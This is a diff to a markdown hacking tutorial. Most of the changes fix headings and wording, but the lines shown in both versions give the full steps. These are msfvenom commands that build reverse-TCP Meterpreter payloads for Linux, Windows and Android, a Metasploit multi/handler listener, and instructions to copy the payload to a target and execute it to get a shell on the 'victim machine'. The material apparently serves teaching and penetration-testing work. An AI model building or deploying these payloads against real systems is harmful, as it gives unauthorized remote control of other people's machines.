@@ -10,33 +10,33 @@ System hacking is itself a vast subject which consists of hacking the different 
 
 
 ### Hands on 
-####1. Creating Metasploit Payloads(Files)
-#####List payloads
+#### 1. Creating Metasploit Payloads(Files)
+##### List payloads
 ```sh
 msfvenom -l
 ```
-#####Binaries
-######Linux
+##### Binaries
+###### Linux
 ```sh
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf -o shell.elf
 ```
-######Windows
+###### Windows
 ```sh
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -o shell.exe
 ```
-######Android
+###### Android
 ```sh
 msfvenom -p android/meterpreter/reverse_tcp -f apk LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f apk  -o shell.apk
 ```
 
-####2. Setting Listner Up(Handler)
+#### 2. Setup Listener (Handler)
 First open MSFCONSOLE, use the following command to open the metasploit console :
 
 ```sh
 msfconsole
 ```
 Once the console has started you need to create an appropriate handler to communicate with your payloads.
-Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Initialize the handler using the following commands.
 
 ```sh
 use exploit/multi/handler
@@ -46,10 +46,10 @@ set LPORT <LPORT value>
 exploit -i -j
 ```
 
-####3. Executing the Payload
-Copy the payload file to our target Windows machine and execute the file. The executable causes the payload to be executed and connect back to the attacking machine (Kali Linux). Immediately, we receive a Meterpreter session on our Kali Linux. This is demonstrated by the Meterpreter > prompt as `Meterpreter session 1 opened `. Now we have a shell on the victim machine.
+#### 3. Execute the Payload
+Copy the payload file to our target system and execute the file. The executable causes the payload to be executed and connect back to the attacking machine (Kali Linux). Immediately, we receive a Meterpreter session on our Kali Linux. This is demonstrated by the Meterpreter > prompt as `Meterpreter session 1 opened `. Now we have a shell on the victim machine.
 
-####4. Basic Commands on Meterpreter
+#### 4. Basic Commands on Meterpreter
 
 To connect to a particular session type
 
@@ -57,7 +57,7 @@ To connect to a particular session type
 sessions -i <sessions id which is open>
 ```
 
-###### List of Basic Commands
+##### List of Basic Commands
 
 1. **?** : Help menu
 2. **shell** : The shell command will present you with a standard shell on the target system.
